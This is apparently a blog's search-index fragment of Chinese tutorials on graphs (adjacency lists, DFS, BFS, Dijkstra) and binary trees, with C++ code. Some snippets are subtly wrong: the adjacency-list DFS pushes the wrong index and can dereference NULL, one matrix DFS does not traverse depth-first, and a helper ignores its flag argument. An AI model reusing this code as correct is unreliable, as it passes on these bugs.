从图中可以看出，顶点表的各个结点由data和firstedge两个域表示，data是数据域，存储顶点的信息，firstedge是指针域，指向边表的第一个结点，即此顶点的第一个邻接点。边表结点由adjvex和next两个域组成。adjvex是邻接点域，存储某顶点的邻接点在顶点表中的下标，next则存储指向边表中下一个结点的指针。 对于带权值的网图，可以在边表结点定义中再增加一个weight的数据域，存储权值信息即可。如下图所示。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123#include &lt;iostream&gt;#include &lt;stack&gt;#include &lt;queue&gt;using namespace std;#if 1#define MaxVertex 100// 邻接点的结构体struct edgeNode&#123; // 当前顶点在顶点数组中的位置 int position; // 指向后继节点的指针 struct edgeNode* next; // 节点相关的信息 - info int weight;&#125;;// 顶点数组的结构体struct Vertex&#123; // 顶点的名字 char name[9]; // 指向临接点结构体指针 struct edgeNode* first;&#125;;// 邻接表图结构struct GraphList&#123; // 顶点数组 Vertex head[MaxVertex]; // 顶点的个数 int vertexNum; // 边的条数 int edgeNum;&#125;;//获取点对应的下标int LocalVertex(GraphList&amp;g, char* name)&#123; for (int i = 0; i &lt; g.vertexNum; ++i) &#123; if (strcmp(name, g.head[i].name) == 0) &#123; return i; &#125; &#125; return -1; // 没找到&#125;// 创建一个图void CreateGraph(GraphList &amp;g)&#123; cout &lt;&lt; \"请输入图的顶点数和边数: 顶点 边\" &lt;&lt; endl; cin &gt;&gt; g.vertexNum &gt;&gt; g.edgeNum; cout &lt;&lt; \"请输入\" &lt;&lt; g.vertexNum &lt;&lt; \"个顶点的值\" &lt;&lt; endl; for (int i = 0; i &lt; g.vertexNum; ++i) &#123; cin &gt;&gt; g.head[i].name; g.head[i].first = NULL; // 目前没有邻接点 &#125; cout &lt;&lt; \"请输入\" &lt;&lt; g.edgeNum &lt;&lt; \"条边, 顶点1 顶点2\" &lt;&lt; endl; char v1[9], v2[9]; for (int i = 0; i &lt; g.edgeNum; ++i) &#123; cin &gt;&gt; v1 &gt;&gt; v2; // 以M为头结点的链表, n是m的;邻接点 // 求用户输入的顶点在顶点数组中的位置 int m = LocalVertex(g, v1); int n = LocalVertex(g, v2); // 链表中添加邻接点 edgeNode* pNew = new edgeNode; // init pNew pNew-&gt;position = n; // 当前的节点在顶点数组中的位置 // pNew添加到头结点数组第m个元素 对应的链表中 // 头插法 尾插法需要遍历到尾部 ，麻烦，因此用头插法 pNew-&gt;next = g.head[m].first; g.head[m].first = pNew;#if 1 // 以N为头结点的链表, m是n的;邻接点 edgeNode* pNew1 = new edgeNode; // init pNew1 pNew1-&gt;position = m; // 当前的节点在顶点数组中的位置 // pNew添加到头结点数组第m个元素 对应的链表中 // 头插法 pNew1-&gt;next = g.head[n].first; g.head[n].first = pNew1;#endif &#125;&#125;// 打印图void PrintGraphList(GraphList&amp; g)&#123; for (int i = 0; i &lt; g.vertexNum; ++i) &#123; edgeNode* pNode = g.head[i].first; cout &lt;&lt; g.head[i].name &lt;&lt; \": \"; while (pNode != NULL) &#123; int index = pNode-&gt;position; cout &lt;&lt; g.head[index].name &lt;&lt; \" ,\"; pNode = pNode-&gt;next; &#125; cout &lt;&lt; endl; &#125; cout &lt;&lt; endl;&#125;int main()&#123; GraphList g; CreateGraph(g); PrintGraphList(g); system(\"pause\"); return 0;&#125;#endif 图的遍历 图的遍历和树的遍历类似，希望从图中某一顶点出发访遍图中其余顶点，且使每一个顶点仅被访问一次，这一过程就叫图的遍历。 对于图的遍历来说，如何避免因回路陷入死循环，就需要科学地设计遍历方案，通常有两种遍历次序方案：深度优先遍历和广度优先遍历。 深度优先遍历(DFSdepth first search) 深度优先遍历，也有称为深度优先搜索，简称DFS。其实，就像是一棵树的前序遍历。 它从图中某个结点v出发，访问此顶点，然后从v的未被访问的邻接点出发深度优先遍历图，直至图中所有和v有路径相通的顶点都被访问到。若图中尚有顶点未被访问，则另选图中一个未曾被访问的顶点作起始点，重复上述过程，直至图中的所有顶点都被访问到为止。 深度优先搜索是通过栈来实现的。 下图中的数字显示了深度优先搜索顶点被访问的顺序 为了实现深度优先搜索，首先选择一个起始顶点并需要遵守三个规则： 如果可能，访问一个邻接的未访问顶点，标记它，并把它放入栈中。 当不能执行规则1时，如果栈不空，就从栈中弹出一个顶点。 如果不能执行规则1和规则2，就完成了整个搜索过程。 邻接矩阵深度优先遍历 1234567891011121314151617181920212223242526272829303132333435363738// 深度优先搜索void DFS(Graph&amp; g)&#123; bool* visited = new bool[g.vertexNum]; // init for (int i = 0; i &lt; g.vertexNum; ++i) &#123; visited[i] = false; &#125; // 从顶点数组中的第一个开始访问 stack&lt;int&gt; st; // int - 顶点数组的下标 visited[0] = true; cout &lt;&lt; g.vertex[0] &lt;&lt; \" \"; st.push(0); while (!st.empty()) &#123; // 遍历所有的顶点, 找邻接点 - 栈顶元素对应的邻接点 for (int i = 0; i &lt; g.vertexNum; ++i) &#123; // 栈顶元素在顶点数组中的位置 int top = st.top(); if (!visited[i] &amp;&amp; g.edge[top][i] &gt; 0) &#123; // 遍历该顶点 visited[i] = true; cout &lt;&lt; g.vertex[i] &lt;&lt; \" \"; // 邻接点压栈 st.push(i); &#125; &#125; // 栈顶的顶点与其余的顶点组成的边全部判断了一遍 st.pop(); &#125; delete[] visited;&#125; 邻接表深度优先遍历 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748// 深度优先搜索void DFS(GraphList&amp; g)&#123; // 保证顶点不被重复遍历 bool* visited = new bool[g.vertexNum]; // init for (int i = 0; i &lt; g.vertexNum; ++i) &#123; visited[i] = false; &#125; // 从顶点数组中找一个顶点, 开始遍历 - 0 stack&lt;int&gt; st; // int - 顶点在顶点数组中的下标 st.push(0); // 访问 visited[0] = true; cout &lt;&lt; g.head[0].name &lt;&lt; \" \"; // 当栈为空, 遍历完成 while (!st.empty()) &#123; // 顶点在顶点数组中的下标取出来 int top = st.top(); // 找下标对应的顶点的邻接点 edgeNode* pNode = g.head[top].first; while (pNode) &#123; // 如果节点被遍历过了 while (pNode &amp;&amp; visited[pNode-&gt;position]) &#123; // 指针后移 pNode = pNode-&gt;next; &#125; // 找到了没有被访问的 if (pNode) &#123; // 访问 visited[pNode-&gt;position] = true; cout &lt;&lt; g.head[pNode-&gt;position].name &lt;&lt; \" \"; // 找新的顶点pNode-&gt;position的邻接点 // 链表和链表直接做跳转 pNode = g.head[pNode-&gt;position].first; st.push(pNode-&gt;position); &#125; &#125; st.pop(); &#125; delete[] visited;&#125; 广度优先遍历(BFS Breadth First Search) 广度优先遍历，又称为广度优先搜索，简称BFS。图的广度优先遍历就类似于树的层序遍历了。 在深度优先搜索中，算法表现得好像要尽快地远离起始点似的。相反，在广度优先搜索中，算法好像要尽可能地靠近起始点。它首先访问起始顶点的所有邻接点，然后再访问较远的区域。它是用队列来实现的。 下面图中的数字显示了广度优先搜索顶点被访问的顺序。 实现广度优先搜索，也要遵守三个规则： 访问下一个未来访问的邻接点，这个顶点必须是当前顶点的邻接点，标记它，并把它插入到队列中。 如果因为已经没有未访问顶点而不能执行规则1时，那么从队列头取一个顶点，并使其成为当前顶点。 如果因为队列为空而不能执行规则2，则搜索结束。 邻接矩阵广度优先遍历 123456789101112131415161718192021222324252627282930313233343536373839// 广度优先搜索void BFS(Graph&amp; g)&#123; // 保证顶点不被重复遍历 bool* visited = new bool[g.vertexNum]; // init for (int i = 0; i &lt; g.vertexNum; ++i) &#123; visited[i] = false; &#125; // 找一个顶点, 开始访问 - 0 queue&lt;int&gt; q; // 存储顶点的下标 visited[0] = true; cout &lt;&lt; g.vertex[0] &lt;&lt; \" \"; q.push(0); // 如果队列为空, 遍历完成 while (!q.empty()) &#123; // 队头顶点的下标值拿出来 int front = q.front(); // 遍历所有的顶点, 找邻接点 for (int i = 0; i &lt; g.vertexNum; ++i) &#123; // 如果没被访问, 并且两顶点互为邻接点 if (!visited[i] &amp;&amp; g.edge[front][i] &gt; 0) &#123; // 访问,并且入队列 visited[i] = true; cout &lt;&lt; g.vertex[i] &lt;&lt; \" \"; q.push(i); &#125; &#125; // 所有的邻接点都访问完成,出队列 q.pop(); &#125; delete[] visited;&#125; 邻接表广度优先遍历 1234567891011121314151617181920212223242526272829303132333435363738394041void BFS(GraphList&amp; g)&#123; // 保证顶点不被重复遍历 bool* visited = new bool[g.vertexNum]; // init for (int i = 0; i &lt; g.vertexNum; ++i) &#123; visited[i] = false; &#125; // 从顶点数组中找一个顶点, 开始遍历 - 0 queue&lt;int&gt; q; // int - 顶点在顶点数组中的下标 q.push(0); // 访问 visited[0] = true; cout &lt;&lt; g.head[0].name &lt;&lt; \" \"; // 队列为空,遍历完成 while (!q.empty()) &#123; // 取出队头元素值, 顶点在顶点数组中的下标 int front = q.front(); // 找队头元素对应的定点的所有的邻接点 edgeNode* pNode = g.head[front].first; while (pNode) &#123; // 如果没有被访问 if (!visited[pNode-&gt;position]) &#123; visited[pNode-&gt;position] = true; cout &lt;&lt; g.head[pNode-&gt;position].name &lt;&lt; \" \"; // 邻接点入队列 q.push(pNode-&gt;position); &#125; pNode = pNode-&gt;next; &#125; // 所有的临界点发全部被访问 q.pop(); &#125; delete[] visited;&#125; 迪杰斯特拉(Dijkstra)算法 visit表示该点是否被访问过 dist数组存放起点到各个点的距离 以济南为中间结点，济南到武汉的距离为400且小于北京直接到武汉的距离，所以更新dist数组中北京到武汉的距离为400，并将visit数组中的济南点设置为1，代表已访问过 以武汉为中间结点，武汉到北京的距离是400 + 200 等于600，更新dist数组，因为武汉到其他点只有北京一个没有被访问过，所以当更新了武汉到北京的距离之后，visit数组中的武汉点可以设置为1，代表已经访问过。 最后剩下北京点没有被访问过，因为北京点是目标点，所以visit数组中的北京点可以直接设置为1 初始化北京到其他点的距离 选择北京到达其他点最近的点，北京到天津的距离为100，是最近的点，所以选择天津作为中间结点 天津到郑州的距离为1000,1000小于1200，所以更新dist数组 天津到济南的距离为400 更新dist数组 将天津设置为已访问的结点 现在剩下济南，郑州，长沙，海南没有被访问过 选择北京到剩下的结点中最短距离的结点济南作为中间点 济南到郑州的距离为400 + 400 = 800, 800 &lt; 1000所以更新dist数组 济南到长沙的距离为400 + 1300 = 1700,更新dist数组 济南到海南的距离为400 + 1400 = 1800,更新dist数组 将济南结点设置为已访问过的结点 现在剩下郑州,长沙,海南三个结点没有被访问过. 选择北京到剩下结点中最短距离的结点作为中间结点 这里选择郑州作为中间结点 郑州到长沙的距离为800 + 500 = 1300,1300 &lt; 1700,所以更新dist数组 将郑州设置为已访问过的结点 选择北京到剩下结点中最短的距离作为中间结点 这里选择长沙,长沙到海南的距离是1300 + 1500 = 2800 ,2800 &gt; 1800,所以不用更新dist数组 将长沙设置为已访问的结点 最后剩下海南结点没有被访问 因为海南结点是最后一个结点,所以直接将海南结点设置为已访问结点即可 最后dist数组中存放了北京到达其他城市的最短距离 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343#include &lt;iostream&gt;#include &lt;stack&gt;#include &lt;queue&gt;using namespace std;//定义顶点的最大值#define MaxVertex 50//定义顶点类型typedef char VertexInfo[4];//定义一个图的结构体struct Graph&#123; //一维数组 -- 顶点信息 VertexInfo vertex[MaxVertex]; //二维数组 -- 边或者弧 对应关系 或者 权 int edge[MaxVertex][MaxVertex]; //顶点的个数 int vertexNum; //边的条数 int edgeNum;&#125;;//寻找顶点在一维数组中的位置int localVertex(Graph &amp;g, VertexInfo v)&#123; //遍历顶点数组 for (int i = 0; i &lt; g.vertexNum; ++i) &#123; //寻找值与v相等的顶点 if (strcmp(v, g.vertex[i]) == 0) &#123; return i; &#125; &#125; return -1;&#125;//用邻接矩阵创建图 -- 有向的网图void createGraph(Graph &amp;g)&#123; cout &lt;&lt; \"输入图的顶点数和边数(用空格间隔)\" &lt;&lt; endl; cin &gt;&gt; g.vertexNum &gt;&gt; g.edgeNum; cout &lt;&lt; \"请输入图的\" &lt;&lt; g.vertexNum &lt;&lt; \"个顶点: \" &lt;&lt; endl; //循环输入 for (int i = 0; i &lt; g.vertexNum; ++i) &#123; //接收顶点的值 cin &gt;&gt; g.vertex[i]; &#125; //初始化顶点之间的对应关系 for (int i = 0; i &lt; g.vertexNum; ++i) &#123; for (int j = 0; j &lt; g.vertexNum; ++j) &#123; //初始化为最大值 g.edge[i][j] = INT_MAX; &#125; &#125; //定义变量 int w; //权重 VertexInfo v1, v2; //顶点 //输入边和权重 cout &lt;&lt; \"依次输入\" &lt;&lt; g.edgeNum &lt;&lt; \"条边的 弧尾 弧头 权重\" &lt;&lt; endl; //循环输入 for (int i = 0; i &lt; g.edgeNum; i++) &#123; cin &gt;&gt; v1 &gt;&gt; v2 &gt;&gt; w; //找到v1在一维数组中的位置 int m = localVertex(g, v1); //找到v2在一维数组中的位置 int n = localVertex(g, v2); //赋值 g.edge[m][n] = w; //如果是无向图 g.edge[n][m] = w; &#125;&#125;//打印图void printGraph(Graph &amp;g)&#123; cout &lt;&lt; \"打印图 -- 邻接矩阵:\" &lt;&lt; endl; cout &lt;&lt; \"\\t\"; for (int i = 0; i &lt; g.vertexNum; ++i) &#123; cout &lt;&lt; g.vertex[i] &lt;&lt; \"\\t\"; &#125; for (int i = 0; i &lt; g.vertexNum; ++i) &#123; cout &lt;&lt; endl; cout &lt;&lt; g.vertex[i] &lt;&lt; \"\\t\"; for (int j = 0; j &lt; g.vertexNum; ++j) &#123; if (g.edge[i][j] == INT_MAX) &#123; cout &lt;&lt; \"∞\" &lt;&lt; \"\\t\"; &#125; else &#123; cout &lt;&lt; g.edge[i][j] &lt;&lt; \"\\t\"; &#125; &#125; &#125; cout &lt;&lt; endl;&#125;//深度优先搜索void DFS(Graph &amp;g)&#123; //创建一个数组,标记节点是否已经被访问 bool *visited = new bool[g.vertexNum]; //数组初始化 for (int i = 0; i &lt; g.vertexNum; ++i) &#123; //全部标记为未访问 visited[i] = false; &#125; //创建栈对象 stack&lt;int&gt; st; //从数组的第一个顶点开始 //访问第一个顶点 visited[0] = true; //打印第一个顶点 cout &lt;&lt; g.vertex[0] &lt;&lt; \" \"; //下标压栈 st.push(0); while (!st.empty()) &#123; int i; for (i = 0; i &lt; g.vertexNum; ++i) &#123; //取出顶点 int top = st.top(); //顶点的邻接点 -- 没有被访问过 if (!visited[i] &amp;&amp; g.edge[top][i] &lt; INT_MAX) &#123; //访问 visited[i] = true; //打印 cout &lt;&lt; g.vertex[i] &lt;&lt; \" \"; //下标压栈 st.push(i); &#125; &#125; //查找完一遍,栈顶元素出栈 if (i &gt;= g.vertexNum) &#123; st.pop(); &#125; &#125; delete[] visited;&#125;//广度优先搜索void BFS(Graph &amp;g)&#123; //创建一个数组,标记顶点是否被访问 bool *visited = new bool[g.vertexNum]; //初始化 for (int i = 0; i &lt; g.vertexNum; ++i) &#123; //false -- 未访问 visited[i] = false; &#125; //定义一个队列对象 queue&lt;int&gt; q; //第一个顶点标记为已访问 visited[0] = true; //打印第一个顶点 cout &lt;&lt; g.vertex[0] &lt;&lt; \" \"; //顶点在数组中的下标,入队列 q.push(0); while (!q.empty()) &#123; int front = q.front(); for (int i = 0; i &lt; g.vertexNum; ++i) &#123; //寻找队列中队头的顶点的邻接点 if (!visited[i] &amp;&amp; g.edge[front][i] &lt; INT_MAX) &#123; //标记为已访问 visited[i] = true; //打印 cout &lt;&lt; g.vertex[i] &lt;&lt; \" \"; //下标入队列 q.push(i); &#125; &#125; //寻找完所有的邻接点之后,下标出队列 q.pop(); &#125; delete[] visited;&#125;// 最短路径// 迪杰斯特拉(Dijkstra)算法// path哪一顶点到当前点的距离最近void dijkstraPath(Graph &amp;g, int *path, int *dist, int v0)&#123; int min = 0; int pos = v0; // 访问的起始顶点 //定义一个数组, 标记顶点是否已经被访问 bool *visited = new bool[g.vertexNum]; //初始化 for (int i = 0; i &lt; g.vertexNum; ++i) &#123; visited[i] = false; //顶点未访问 if (i != v0) //排除顶点到出发点的计算 &#123; //初始化所有点的最近邻接点都是V0点 path[i] = v0; // v0到各个顶点的权重 dist[i] = g.edge[v0][i]; cout &lt;&lt; g.vertex[v0] &lt;&lt; \" 到 \" &lt;&lt; g.vertex[i] &lt;&lt; \" 距离: dist[\" &lt;&lt; i &lt;&lt; \"]=\" &lt;&lt; dist[i] &lt;&lt; endl; &#125; else &#123; // path[]数组 - 到当前点的最近的邻接点 // dist[] 数组 - 从出发点到各个点的最短距离 // i == v0没有任何意义, 不存在路径 path[i] = -1; dist[i] = INT_MAX; &#125; &#125; //把v0标记为已访问 visited[v0] = true; for (int i = 0; i &lt; g.vertexNum; ++i) &#123; min = INT_MAX; for (int j = 0; j &lt; g.vertexNum; ++j) &#123; // 没有被访问, 并且找到了拥有更小权值的边 // path[]数组 - 到当前点的最近的邻接点 // dist[] 数组 - 从出发点到各个点的最短距离 if (!visited[j] &amp;&amp; min&gt;dist[j]) &#123; //保存最小值 min = dist[j]; //保存位置 pos = j; cout &lt;&lt; \"+++ 顶点更新: pos =\" &lt;&lt; pos &lt;&lt; \"顶点为: \" &lt;&lt; g.vertex[pos] &lt;&lt; endl; &#125; &#125; //pos位置的顶点标记为已访问 visited[pos] = true; // dist V0点到各个点的距离 for (int j = 0; j &lt; g.vertexNum; ++j) &#123; // g.edge[pos][j] &lt; INT_MAX - 判断pos-&gt;j这条边是存在的 if (!visited[j] &amp;&amp; dist[pos] + g.edge[pos][j] &lt; dist[j] &amp;&amp; g.edge[pos][j] &lt; INT_MAX) &#123; // 更新最短距离 //例如 将j看成E pos看成B，求出A到E最短路径 dist[j] = dist[pos] + g.edge[pos][j]; //更新路径, 到顶点j最近的顶点是pos path[j] = pos; cout &lt;&lt; \"=== 更新最短距离: dist[\" &lt;&lt; j &lt;&lt; \"] = \" &lt;&lt; dist[j] &lt;&lt; endl; &#125; &#125; &#125;&#125;// v0 - 起始点// v - 到达点void showPath(Graph &amp;g, int *path, int v0, int v)&#123; //创建一个栈对象 stack&lt;int&gt; st; int temp = v; while (temp != v0) &#123; st.push(temp); //寻找上一个顶点 temp = path[temp]; &#125; st.push(v0); //打印路径 while (!st.empty()) &#123; cout &lt;&lt; g.vertex[st.top()] &lt;&lt; \" \"; st.pop(); &#125;&#125;int main()&#123; //定义一个图的对象 Graph g; //用邻接矩阵创建图 createGraph(g); //打印 printGraph(g); //深度优先搜索 cout &lt;&lt; \"深度优先搜索\" &lt;&lt; endl; DFS(g); cout &lt;&lt; endl; //广度优先搜索 cout &lt;&lt; \"广度优先搜索\" &lt;&lt; endl; BFS(g); cout &lt;&lt; endl; /*================================================== ==================================================*/ cout &lt;&lt; \"迪杰斯特拉(Dijkstra)算法\" &lt;&lt; endl; // path数组 - 到当前点的最近的邻接点 int path[50]; // dist[] 数组 - 从出发点到各个点的最短距离 int dist[50]; // 出发点 int v0 = 0; dijkstraPath(g, path, dist, v0); // A-&gt;D怎么走?多么长? // dist[3] = A-&gt;D的最短距离 // path[3] for (int i = 1; i &lt; g.vertexNum; ++i) &#123; cout &lt;&lt; \"路径: \"; showPath(g, path, v0, i); cout &lt;&lt; \"路径长度: \" &lt;&lt; dist[i] &lt;&lt; endl; &#125; cout &lt;&lt; \"Keyboard not found, press F1 to continue...\" &lt;&lt; endl; system(\"pause\"); return 0;&#125;","categories":[{"name":"cpp","slug":"cpp","permalink":"https://xiaowuyoucy.github.io/categories/cpp/"}],"tags":[]},{"title":"树和二叉树","slug":"树和二叉树","date":"2022-04-04T14:07:32.000Z","updated":"2022-04-24T06:28:26.451Z","comments":true,"path":"2022/04/04/树和二叉树/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/04/04/树和二叉树/","excerpt":"","text":"树基本概念 树的定义： 由一个或多个(n≥0)结点组成的有限集合T，有且仅有一个结点称为根（root），当n&gt;1时，其余的结点分为m(m≥0)个互不相交的有限集合T1,T2，…，Tm。每个集合本身又是棵树，被称作这个根的子树 。 树的结构特点 非线性结构，有一个直接前驱，但可能有多个直接后继（1:n） 树的定义具有递归性，树中还有树。 树可以为空，即节点个数为0。 若干术语 根 -&gt; 即根结点(没有前驱) 叶子 -&gt; 即终端结点(没有后继) 森林 -&gt; 指m棵不相交的树的集合(例如删除A后的子树个数) 有序树 -&gt; 结点各子树从左至右有序，不能互换（左为第一） 无序树 -&gt; 结点各子树可互换位置。 双亲 -&gt; 即上层的那个结点(直接前驱) parent 孩子 -&gt; 即下层结点的子树 (直接后继) child 兄弟 -&gt; 同一双亲下的同层结点（孩子之间互称兄弟）sibling 堂兄弟 -&gt; 即双亲位于同一层的结点（但并非同一双亲）cousin 祖先 -&gt; 即从根到该结点所经分支的所有结点 子孙 -&gt; 即该结点下层子树中的任一结点 结点 -&gt; 即树的数据元素 结点的度 -&gt; 结点挂接的子树数（有几个直接后继就是几度） 结点的层次 -&gt; 从根到该结点的层数（根结点算第一层） 终端结点 -&gt; 即度为0的结点，即叶子 分支结点 -&gt; 除树根以外的结点（也称为内部结点） 树的度 -&gt; 所有结点度中的最大值（Max{各结点的度}） 树的深度(或高度) -&gt; 指所有结点中最大的层数（Max{各结点的层次}） 上图中的结点数＝ 13，树的度＝ 3，树的深度＝ 4 树的表示法 图形表示法 事物之间的逻辑关系可以通过数的形式很直观的表示出来，如下图： 广义表表示法 用广义表表示法表示上图： 中国（河北（保定，石家庄），广东（广州，东莞），山东（青岛，济南）） 根作为由子树森林组成的表的名字写在表的左边 左孩子右兄弟表示法 左孩子右兄弟表示法可以将一颗多叉树转化为一颗二叉树： 二叉树概念 基本概念 定义 n（n≥0）个结点的有限集合，由一个根结点以及两棵互不相交的、分别称为左子树和右子树的二叉树组成 。 逻辑结构 一对二（1：2） 基本特征: 每个结点最多只有两棵子树（不存在度大于2的结点）； 左子树和右子树次序不能颠倒（有序树）。 基本形态： 二叉树性质 性质1: 在二叉树的第i层上至多有2i&gt;-1个结点（i&gt;0） 性质2: 深度为k的二叉树至多有2k-1个结点（k&gt;0） 性质3: 对于任何一棵二叉树，若2度的结点数有n2个，则叶子数（n0）必定为n2＋1 （即n0=n2+1） 概念解释： 满二叉树 一棵深度为k 且有2k -1个结点的二叉树。 ​ 特点：每层都“充满”了结点 完全二叉树 深度为k 的，有n个结点的二叉树，当且仅当其每一个结点都与深度为k 的满二叉树中编号从1至n的结点一一对应。 理解：k-1层与满二叉树完全相同，第k层结点尽力靠左 性质4: 具有n个结点的完全二叉树的深度必为[log2n] + 1 性质5: 对完全二叉树，若从上至下、从左至右编号，则编号为i 的结点，其左孩子编号必为2i，其右孩子编号必为2i＋1；其双亲的编号必为i/2（i＝1 时为根,除外） 使用此性质可以使用完全二叉树实现树的顺序存储。 如果不是完全二叉树咋整??? ------ 将其转换成完全二叉树即可 二叉树的表示 二叉链表示法 存储结构 结点数据类型定义： 12345typedef struct BiTNode&#123; int data; struct BiTNode *lchild, *rchild;&#125;BiTNode, *BiTree; 三叉链表表示法 存储结构 每个节点有三个指针域，其中两个分别指向子节点（左孩子，右孩子），还有一共指针指向该节点的父节点。 节点数据类型定义 12345678//三叉链表typedef struct TriTNode &#123; int data; //左右孩子指针 struct TriTNode *lchild, *rchild; struct TriTNode *parent;&#125;TriTNode, *TriTree; 二叉树的遍历 遍历定义 指按某条搜索路线遍访每个结点且不重复（又称周游）。 遍历用途 它是树结构插入、删除、修改、查找和排序运算的前提，是二叉树一切运算的基础和核心。 遍历方法 牢记一种约定，对每个结点的查看都是“先左后右” 。 限定先左后右，树的遍历有三种实现方案： DLR LDR LRD 先 (根)序遍历 中 (根)序遍历 后(根)序遍历 DLR — 先序遍历，即先根再左再右 LDR — 中序遍历，即先左再根再右 LRD — 后序遍历，即先左再右再根 注：“先、中、后”的意思是指访问的结点D是先于子树出现还是后于子树出现。 树的遍历，代码实现： 先序遍历 123456789PreOrder(NODE *root )&#123; if (root) //非空二叉树 &#123; printf(“%d”,root-&gt;data); //访问D PreOrder(root-&gt;lchild); //递归遍历左子树 PreOrder(root-&gt;rchild); //递归遍历右子树 &#125;&#125; 中序遍历 123456789InOrder(NODE *root)&#123; if(root !=NULL) &#123; InOrder(root-&gt;lchild); printf(“%d”,root-&gt;data); InOrder(root-&gt;rchild); &#125; &#125; 后序遍历 123456789PostOrder(NODE *root)&#123; if(root !=NULL) &#123; PostOrder(root-&gt;lchild); PostOrder(root-&gt;rchild); printf(“%d”,root-&gt;data); &#125; &#125; 树的遍历，本质剖析： 从前面的三种遍历算法可以知道：如果将printf语句抹去， 123456789//除去printf的遍历算法：XXX (NODE *root)&#123; if(root) &#123; XXX(root-&gt;lchild); XXX(root-&gt;rchild); &#125;&#125; 从递归的角度看，这三种算法是完全相同的，或者说这三种遍历 算法的访问路径是相同的，只是访问结点的时机不同。 从虚线的出发点到终点的路径上，每个结点经过3次。 ​ 从虚线的出发点到终点的路径上，每个结点经过3次。 第1次经过时访问＝先序遍历 第2次经过时访问＝中序遍历 第3次经过时访问＝后序遍历 12345678910typedef struct BITREENODE &#123; char data; BITREENODE * lTreeNode; BITREENODE * rTreeNode;&#125;Bitreenode;typedef struct STACKNODE &#123; Bitreenode * node; int flag;&#125;Stacknode; 计算二叉树中叶子结点的数目 1234567891011121314void GetTreeNumNode(Bitreenode * root,int * num)&#123; if (root == NULL) &#123; return; &#125; if (root-&gt;lTreeNode == NULL &amp;&amp; root-&gt;rTreeNode == NULL) &#123; (*num)++; &#125; GetTreeNumNode(root-&gt;lTreeNode, num); GetTreeNumNode(root-&gt;rTreeNode, num);&#125; 求二叉树的深度 12345678910111213int GetBitreeHeigth(Bitreenode * root) &#123; int lHeight, rHeight; if (root == NULL) &#123; return 0; &#125; lHeight = GetBitreeHeigth(root-&gt;lTreeNode); rHeight = GetBitreeHeigth(root-&gt;rTreeNode); return lHeight &gt; rHeight ? lHeight + 1 : rHeight + 1;&#125; Copy二叉树 12345678910111213Bitreenode * CopyBiTree(Bitreenode * root) &#123; if (root == NULL) &#123; return NULL; &#125; Bitreenode * newNode = (Bitreenode *)malloc(sizeof(Bitreenode)); newNode-&gt;data = root-&gt;data; newNode-&gt;lTreeNode = CopyBiTree(root-&gt;lTreeNode); newNode-&gt;rTreeNode = CopyBiTree(root-&gt;rTreeNode); return newNode;&#125; 树的非递归遍历 第一步:先将根节点和标识打包在一起组成一个新结点 第二步:把刚刚打包的新结点压入栈 第三步:循环,如果栈元素大于0则继续循环 第四步: 取出栈顶元素 第五步:判断栈顶元素中的树节点是否为NULL,如果是则跳出本次循环 第六步: 判断标识是否为MYTRUE,如果是则打印当前结点信息,否则如果标识是MYFALSE则将标识改为MYTRUE,然后将本结点的左右两个结点压入栈,最后把自己压入栈中 入栈顺序 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647typedef struct STACKNODE &#123; Bitreenode * node; int flag;&#125;Stacknode;Stacknode * NewStackNode(Bitreenode * node,int flag) &#123; Stacknode * newNode = (Stacknode *)malloc(sizeof(Stacknode)); newNode-&gt;node = node; newNode-&gt;flag = MYFLASE; return newNode;&#125;void FeiDiGuiBianLi(Bitreenode * root) &#123; if (root == NULL) &#123; return; &#125; stack&lt;Stacknode *&gt; my_stack; my_stack.push(NewStackNode(root,MYFLASE)); while (my_stack.size() &gt; 0) &#123; Stacknode * node = my_stack.top(); my_stack.pop(); if (node-&gt;node == NULL) &#123; continue; &#125; if (node-&gt;flag == MYTRUE) &#123; cout &lt;&lt; node-&gt;node-&gt;data &lt;&lt; &quot; &quot;; &#125; else &#123; node-&gt;flag = MYTRUE; my_stack.push(node); my_stack.push(NewStackNode(node-&gt;node-&gt;rTreeNode,MYFLASE)); my_stack.push(NewStackNode(node-&gt;node-&gt;lTreeNode, MYFLASE)); &#125; &#125;&#125; 二叉树的创建 如何才能确定一棵树？ 结论： 通过中序遍历和先序遍历可以确定一个树 通过中序遍历和后续遍历可以确定一个树 通过先序遍历和后序遍历确定不了一个树。 单独先序遍历：能求解根，但不能求解左子树什么时候结束、右子树什么时候开始。 #号法创建树 1、什么是#号法创建树 #创建树，让树的每一个节点都变成度数为2的树 先序遍历结果: 124###3## #号法编程实践 12345678910111213141516171819Bitreenode * CreateBiTree2()&#123; Bitreenode * T; char ch; char a; scanf(&quot;%c&quot;,&amp;ch); while (( a = getchar()) != &apos;\\n&apos;); if (ch ==&apos;#&apos;) &#123; T = NULL; &#125; else &#123; T = (Bitreenode *)malloc(sizeof(Bitreenode)); T-&gt;data = ch; T-&gt;lTreeNode = CreateBiTree2(); T-&gt;rTreeNode = CreateBiTree2(); &#125; return T;&#125; 释放树 12345678910111213void FreeBiTree(Bitreenode * root)&#123; if (root == NULL) &#123; return; &#125; FreeBiTree(root-&gt;lTreeNode); FreeBiTree(root-&gt;rTreeNode); free(root);&#125;","categories":[{"name":"cpp","slug":"cpp","permalink":"https://xiaowuyoucy.github.io/categories/cpp/"}],"tags":[]},{"title":"define中的特殊符号","slug":"define中的特殊符号","date":"2022-03-27T01:45:50.000Z","updated":"2022-03-27T04:26:18.975Z","comments":true,"path":"2022/03/27/define中的特殊符号/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/03/27/define中的特殊符号/","excerpt":"","text":"1. 符号&quot;\\&quot; 用于多行定义,每行的最后加上&quot;\\&quot; 12345#define MAX(a,b) \\ if(a&gt;b)\\ return a;\\ else\\ 